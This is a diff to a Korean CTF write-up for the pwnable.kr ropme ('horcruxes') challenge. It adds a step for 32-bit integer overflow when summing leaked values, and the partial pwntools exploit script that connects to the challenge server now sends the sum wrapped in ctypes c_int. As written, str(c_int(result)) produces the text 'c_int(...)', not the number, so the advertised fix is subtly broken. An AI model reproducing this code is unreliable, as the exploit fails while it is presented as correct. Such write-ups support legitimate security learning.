@@ -30,10 +30,12 @@ input이 각각의 전역변수 a, b, c, d, e, f, g와 맞으면 A, B, C, D, E, 
 
 각각의 A부터 G까지 함수에서 a부터 g까지 모든 값을 출력해주는 것을 확인할 수 있다.<br>
 모두 호출해서 모든 값을 다 구한 다음에 다 더한 값을 구한 후 ropme를 다시 호출해서 문제를 풀자.<br>
-ropme함수의 주소에는 0x0a가 끼어있기 때문에 ropme를 호출할때도 main함수에 있는 call ropme를 이용해야한다.
+ropme함수의 주소에는 0x0a가 끼어있기 때문에 ropme를 호출할때도 main함수에 있는 call ropme를 이용해야한다.<br>
+sum값을 구할 때 4byte integer범위를 넘어가면 overflow가 나기 때문에 이에 대한 handling을 해야한다. c_int를 이용해 handling했다.
 
 ```python
 from pwn import *
+from ctypes import c_int
 
 p = remote("pwnable.kr", 9032)
 
@@ -57,7 +59,7 @@ print(p.recvuntil(":"))
 p.send("1\n")
 
 print(p.recvuntil(" : "))
-p.send(str(result) + "\n")
+p.send(str(c_int(result)) + "\n")
 p.interactive()
 ```
 
